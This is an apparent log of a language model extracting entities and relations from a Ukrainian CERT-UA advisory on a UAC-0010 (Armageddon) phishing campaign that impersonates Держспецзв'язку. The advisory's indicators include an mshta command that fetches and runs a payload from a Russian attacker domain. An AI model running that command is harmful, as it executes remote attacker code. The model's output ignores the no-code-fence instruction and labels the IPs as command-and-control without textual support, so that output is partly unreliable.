@@ -1,0 +1,274 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens (e.g. `attacks`, `uses`, `delivers`, `targets-sector`, `exploits`, `hosts`, `attributed-to`, `affects`, `located-in`, `part-of`, `sends-email-to`).
+   - REUSE a type from the KNOWN RELATION TYPES below whenever it fits. Introduce a new type only when none fits; then also list it in `newRelationTypes` with a one-line definition.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] for relation types you introduced; an empty array is the normal case.
+
+### KNOWN RELATION TYPES ###
+- publishes: An organization or vendor officially releases or issues a security advisory, bulletin, or patch.
+- addresses-vulnerability-in: A security advisory or patch provides fixes for security vulnerabilities affecting a software product.
+- affects: A security vulnerability compromises or impacts a specific software product or component.
+- located-in: An organization, entity, or infrastructure is geographically or administratively based in a country or location.
+- part-of: An entity or component is a constituent sub-part of a larger system, suite, or organization.
+- hosts: An IP address, server, or domain hosts a specific file, malware payload, or service.
+- delivers: An exploit, campaign, or delivery mechanism drops or downloads a payload onto a target system.
+- exploits: A threat actor, malware, or campaign leverages a specific security vulnerability to compromise systems.
+- attacks: A threat actor compromises, targets, or executes unauthorized actions against a system, service, or organization.
+- communicates-with: A malware payload or host establishes network connections to an external IP address or server.
+- uses-malware: A threat actor utilizes or deploys a specific malware tool or family in their operations.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA з 07.11.2022 фіксуються розсилки електронних листів, начебто, від імені Держспецзв'язку, зі шкідливим посиланням. У разі переходу за посиланням на ЕОМ буде завантажено HTML-файл, який містить JavaScript-код, що забезпечить створення на комп'ютері жертви RAR-архіву, наприклад "08.11.2022.rar".&nbsp;</p><p>Згаданий архів містить файл-ярлик "Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk", відкриття якого призведе до завантаження і запуску HTA-файлу, що, в свою чергу, спричинить створення запланованого завдання та подальший запуск VBScript-коду. Насамкінець, на комп'ютер будуть завантажені інші шкідливі програми, в тому числі, для викрадення файлів.&nbsp;</p><p>Зауважимо, що розсилка електронних листів здійснюється за допомогою сервісу @mail.gov.ua. Крім того, як і раніше, для визначення IP-адреси серверу управління використовується або третьосторонній сервіс (cloudflare-dns[.]com) або Telegram.</p><p>Активність асоційовано з діяльністю групи UAC-0010 (Armageddon).&nbsp;&nbsp;&nbsp;</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">3adbc03f755a67fea42b6ca96b594237&nbsp; &nbsp; 8badadda788a53549ec889f648f3c85354c1765c7a2d8acfbcfc69aa3002e933&nbsp; &nbsp; 07-11-2022.xhtml
+a19a7f22e599b4ff9a30d8917a801ffb&nbsp; &nbsp; 424a9224b2f1a462a5de7222b98e1a95205e5bdad8beae892309be3ad4279363&nbsp; &nbsp; 07.11.2022.rar
+85dc81ba98e7ba81b00c3f4554e23f41&nbsp; &nbsp; c4d44834436baf347f01ac66f7e04e73bc1cb44cd938bd2992bcb11fef958801&nbsp; &nbsp; Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk
+c1074dbc69079bc44f517c5a2092f05e&nbsp; &nbsp; b27b901f363304a188348880df278af5954b288b5c614c3b85e7e1d8057cf3a1&nbsp; &nbsp; growth.rtf
+d67119d10668cd3f78ec2abefc6713d4&nbsp; &nbsp; fe37eae9986ad6d9a1709aa2993e13965d1bd9f0b7733c0a09c2b36531c31086&nbsp; &nbsp; jersey
+146694cdc0e529bb175741c8331fcbda&nbsp; &nbsp; aafde3c78194495c57066b8e6219da1caab9031da1b22f9dc6deef14ac3b5cfc&nbsp; &nbsp; 07_11_2022.xhtml
+5f2d3f456eb549f31afa372d1a877152&nbsp; &nbsp; 95b67d3bb530bf9ce98fa017ec2270176977a775e013df4db2038257ca6d17c3&nbsp; &nbsp; 07.11.2022.rar
+ab8600c3150ff6a5a803130438fdfae9&nbsp; &nbsp; 53f472e9a3d3471a76f13d12417229d23efd11b047353db8b71793feacafb029&nbsp; &nbsp; Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk
+0ede5c6f925b4ef08446c063c4805ff9&nbsp; &nbsp; 94a2b39e00ff03061093cce7ead1aab677c939400428a37a00bf89333655ba82&nbsp; &nbsp; 08.11.2022.arhiv
+1af530c3daa10a6a9ad973bd7e1904ed&nbsp; &nbsp; 704a6ade1ad9ccb52ff52ae86ca0bce068f14134bd4f1ab6f7506b3f201ba55b&nbsp; &nbsp; 08.11.2022.rar
+3864263b8b3d86a1f6861b15c646aab0&nbsp; &nbsp; 1281abff0809bbb1de56bed6f5ebfa111c3c42918732ededae63b76007364582&nbsp; &nbsp; Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk
+</pre><p><br></p><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">08362793@mail.gov[.]ua
+154[.]111.181.171
+173[.]199.90.103
+45[.]32.171.4
+hXXp://arhiv.ua-cip[.]org/08.11.2022.arhiv
+hXXp://tzi.info-cip[.]org/07_11_2022.xhtml
+hXXps://civh[.]ru/08.11/band.rtf
+hXXps://hilr[.]ru/07.11/growth.rtf
+hXXps://hilr[.]ru/07.11/sent.rtf
+hXXps://cloudflare-dns[.]com/dns-query?name= (для визначення IP-адреси; легітимний сервіс)
+hXXps://t[.]me/s/vozmoz2
+hilr[.]ru
+civh[.]ru
+rubidiumo[.]ru
+shapurt[.]ru
+ardeas[.]ru
+tzi.info-cip[.]org
+arhiv.ua-cip[.]org
+ua-cip[.]org
+info-cip[.]org
+</pre><p><br></p><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">C:\Windows\System32\mshta.exe hxxps://civh[.]ru/08.11/band.rtf
+%USERPROFILE%\Contacts\jersey
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p>
+
+=== RESPONSE (7.6s, in 3257 / out 1898 tok, STOP) ===
+UAC-0010 (also known as Armageddon) conducted a malicious email distribution campaign impersonating the State Service of Special Communications and Information Protection of Ukraine. The threat actor used legitimate mail services (@mail.gov.ua) and various malicious URLs and files (.xhtml, .rar, .lnk, .rtf, HTA, VBScript) to compromise victims and deploy info-stealing malware, resolving C2 infrastructure via Telegram and Cloudflare DNS.
+
+```json
+{
+  "entities": [
+    {
+      "name": "UAC-0010",
+      "kind": "threat actor",
+      "gloss": "A cyberespionage group linked to the Russian FSB, also known as Armageddon or Gamaredon."
+    },
+    {
+      "name": "Держспецзв'язку",
+      "kind": "government body",
+      "gloss": "The State Service of Special Communications and Information Protection of Ukraine."
+    },
+    {
+      "name": "Telegram",
+      "kind": "software product",
+      "gloss": "A cloud-based instant messaging and voice over IP service."
+    },
+    {
+      "name": "cloudflare-dns.com",
+      "kind": "internet domain",
+      "gloss": "A public DNS resolver service provided by Cloudflare."
+    },
+    {
+      "name": "mail.gov.ua",
+      "kind": "internet domain",
+      "gloss": "An official email service domain used by Ukrainian government institutions."
+    },
+    {
+      "name": "08362793@mail.gov.ua",
+      "kind": "email address",
+      "gloss": "An email address used to distribute malicious phishing emails."
+    },
+    {
+      "name": "154.111.181.171",
+      "kind": "ip address",
+      "gloss": "An IP address identified as command and control infrastructure."
+    },
+    {
+      "name": "173.199.90.103",
+      "kind": "ip address",
+      "gloss": "An IP address identified as command and control infrastructure."
+    },
+    {
+      "name": "45.32.171.4",
+      "kind": "ip address",
+      "gloss": "An IP address identified as command and control infrastructure."
+    },
+    {
+      "name": "hilr.ru",
+      "kind": "internet domain",
+      "gloss": "A domain used for hosting malicious payloads."
+    },
+    {
+      "name": "civh.ru",
+      "kind": "internet domain",
+      "gloss": "A domain used for hosting malicious payloads."
+    },
+    {
+      "name": "rubidiumo.ru",
+      "kind": "internet domain",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "shapurt.ru",
+      "kind": "internet domain",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "ardeas.ru",
+      "kind": "internet domain",
+      "gloss": "A domain identified as malicious network infrastructure."
+    },
+    {
+      "name": "tzi.info-cip.org",
+      "kind": "internet domain",
+      "gloss": "A subdomain used to host malicious files."
+    },
+    {
+      "name": "arhiv.ua-cip.org",
+      "kind": "internet domain",
+      "gloss": "A subdomain used to host malicious files."
+    },
+    {
+      "name": "ua-cip.org",
+      "kind": "internet domain",
+      "gloss": "A domain used by threat actors to host malicious resources."
+    },
+    {
+      "name": "info-cip.org",
+      "kind": "internet domain",
+      "gloss": "A domain used by threat actors to host malicious resources."
+    },
+    {
+      "name": "07-11-2022.xhtml",
+      "kind": "file",
+      "gloss": "A malicious HTML/XHTML file used to drop archive payloads."
+    },
+    {
+      "name": "07_11_2022.xhtml",
+      "kind": "file",
+      "gloss": "A malicious HTML/XHTML file used to drop archive payloads."
+    },
+    {
+      "name": "07.11.2022.rar",
+      "kind": "file",
+      "gloss": "A malicious RAR archive containing a shortcut file."
+    },
+    {
+      "name": "08.11.2022.rar",
+      "kind": "file",
+      "gloss": "A malicious RAR archive containing a shortcut file."
+    },
+    {
+      "name": "08.11.2022.arhiv",
+      "kind": "file",
+      "gloss": "A malicious archive file hosted on adversary infrastructure."
+    },
+    {
+      "name": "Засоби ТЗІ, які мають експертний висновок про відповідність до вимог технічного захисту інформації.lnk",
+      "kind": "file",
+      "gloss": "A malicious Windows shortcut file used to execute HTA payloads."
+    },
+    {
+      "name": "growth.rtf",
+      "kind": "file",
+      "gloss": "A malicious payload file disguised with an RTF extension."
+    },
+    {
+      "name": "band.rtf",
+      "kind": "file",
+      "gloss": "A malicious payload file executed via mshta."
+    },
+    {
+      "name": "sent.rtf",
+      "kind": "file",
+      "gloss": "A malicious payload file disguised with an RTF extension."
+    },
+    {
+      "name": "jersey",
+      "kind": "file",
+      "gloss": "A malware payload dropped to the user profile directory."
+    }
+  ],
+  "relations": [
+    {
+      "head": "arhiv.ua-cip.org",
+      "type": "hosts",
+      "tail": "08.11.2022.arhiv",
+      "evidence": "hXXp://arhiv.ua-cip[.]org/08.11.2022.arhiv"
+    },
+    {
+      "head": "tzi.info-cip.org",
+      "type": "hosts",
+      "tail": "07_11_2022.xhtml",
+      "evidence": "hXXp://tzi.info-cip[.]org/07_11_2022.xhtml"
+    },
+    {
+      "head": "civh.ru",
+      "type": "hosts",
+      "tail": "band.rtf",
+      "evidence": "hXXps://civh[.]ru/08.11/band.rtf"
+    },
+    {
+      "head": "hilr.ru",
+      "type": "hosts",
+      "tail": "growth.rtf",
+      "evidence": "hXXps://hilr[.]ru/07.11/growth.rtf"
+    },
+    {
+      "head": "hilr.ru",
+      "type": "hosts",
+      "tail": "sent.rtf",
+      "evidence": "hXXps://hilr[.]ru/07.11/sent.rtf"
+    },
+    {
+      "head": "arhiv.ua-cip.org",
+      "type": "part-of",
+      "tail": "ua-cip.org",
+      "evidence": "arhiv.ua-cip[.]org"
+    },
+    {
+      "head": "tzi.info-cip.org",
+      "type": "part-of",
+      "tail": "info-cip.org",
+      "evidence": "tzi.info-cip[.]org"
+    }
+  ],
+  "newRelationTypes": []
+}
+```
